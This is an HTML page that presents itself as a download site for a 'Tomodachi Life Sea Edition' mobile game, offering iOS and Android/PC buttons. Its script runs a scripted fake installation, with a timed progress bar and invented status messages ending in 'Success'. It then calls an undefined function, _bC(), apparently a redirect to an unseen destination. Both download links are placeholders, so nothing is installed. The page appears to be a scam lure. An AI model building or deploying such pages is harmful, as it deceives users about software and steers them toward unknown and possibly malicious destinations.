<body>

    <div id="main-content" class="px-6 transition-all duration-700">
        <header class="header-section">
            <img id="top-logo" src="https://upload.wikimedia.org/wikipedia/en/thumb/b/b4/TomodachiLifeBoxartNA.jpg/250px-TomodachiLifeBoxartNA.jpg" alt="Logo" class="main-logo">
            <h1 class="text-4xl font-black uppercase tracking-tighter">Tomodachi Life</h1>
            <p class="selection-label">Sea Edition</p>

            <div class="slider-wrapper">
                <div id="slides-track">
                    <div class="slide-item"><img src="https://tomodachimobile.com/img/5994451268115565882_121.jpg"></div>
                    <div class="slide-item"><img src="https://tomodachimobile.com/img/Image-from-iOS-2.jpg"></div>
                </div>
            </div>
        </header>

        <main class="max-w-md mx-auto pb-12">
            <p class="text-center text-[10px] uppercase font-bold tracking-[0.2em] text-cyan-200/50 mb-4">Select Your Vessel</p>
            <div class="version-list">
                <div onclick="selectVer('ios')" id="btn-ios" class="version-btn">
                    <span>iOS (iPhone)</span>
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M9 5l7 7-7 7"></path></svg>
                </div>
                <div onclick="selectVer('android')" id="btn-android" class="version-btn">
                    <span>Android / PC</span>
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M9 5l7 7-7 7"></path></svg>
                </div>
            </div>

            <button onclick="startInstall()" class="download-btn">Download Now</button>
            <p id="error-msg" class="text-center text-[11px] mt-4 font-black text-red-300 h-4 uppercase tracking-wider"></p>
        </main>
    </div>

    <!-- Installation Overlay -->
    <div id="install-overlay">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/b/b4/TomodachiLifeBoxartNA.jpg/250px-TomodachiLifeBoxartNA.jpg" class="loading-logo">
        <h2 id="status-title" class="status-text">Connecting...</h2>
        <div class="progress-outer">
            <div id="progress-bar" class="progress-inner"></div>
        </div>
        <div id="status-log" class="log-msg">> Securing ocean link...</div>
    </div>

    <script>
        const LINKS = {
            android: "#",
            ios: "#"
        };

        let selected = null;
        let slideIdx = 0;

        // Auto-slider logic
        function moveSlide() {
            slideIdx = (slideIdx + 1) % 2;
            const track = document.getElementById('slides-track');
            if(track) track.style.transform = `translateX(-${slideIdx * 100}%)`;
        }
        setInterval(moveSlide, 4500);

        // Version selection logic
        function selectVer(id) {
            selected = id;
            document.querySelectorAll('.version-btn').forEach(b => b.classList.remove('active'));
            document.getElementById('btn-' + id).classList.add('active');
            
            const logo = document.getElementById('top-logo');
            logo.classList.add('logo-active');
            
            document.getElementById('error-msg').textContent = "";
        }

        // Install animation sequence
        function startInstall() {
            if (!selected) {
                document.getElementById('error-msg').textContent = "Pick a device version";
                return;
            }

            // Transition to loading screen
            document.getElementById('main-content').classList.add('fade-exit');
            const overlay = document.getElementById('install-overlay');
            const bar = document.getElementById('progress-bar');
            const log = document.getElementById('status-log');
            const title = document.getElementById('status-title');

            setTimeout(() => {
                overlay.style.display = 'flex';
                setTimeout(() => overlay.style.opacity = '1', 50);

                const steps = [
                    { p: "35%", t: "> Securing ocean link...", l: "Connecting" },
                    { p: "70%", t: "> Initializing deep dive...", l: "Synchronizing" },
                    { p: "100%", t: "> Surfacing at destination...", l: "Success" }
                ];

                steps.forEach((s, i) => {
                    setTimeout(() => { 
                         bar.style.width = s.p; 
                         log.textContent = s.t; 
                         title.textContent = s.l;
                        
                        // Final redirect
                        if(i === 2) {
                            setTimeout(() => {
                                 _bC();
                            }, 1200);
                        }
                    }, (i + 1) * 1500);
                });
            }, 600);
        }
    </script>
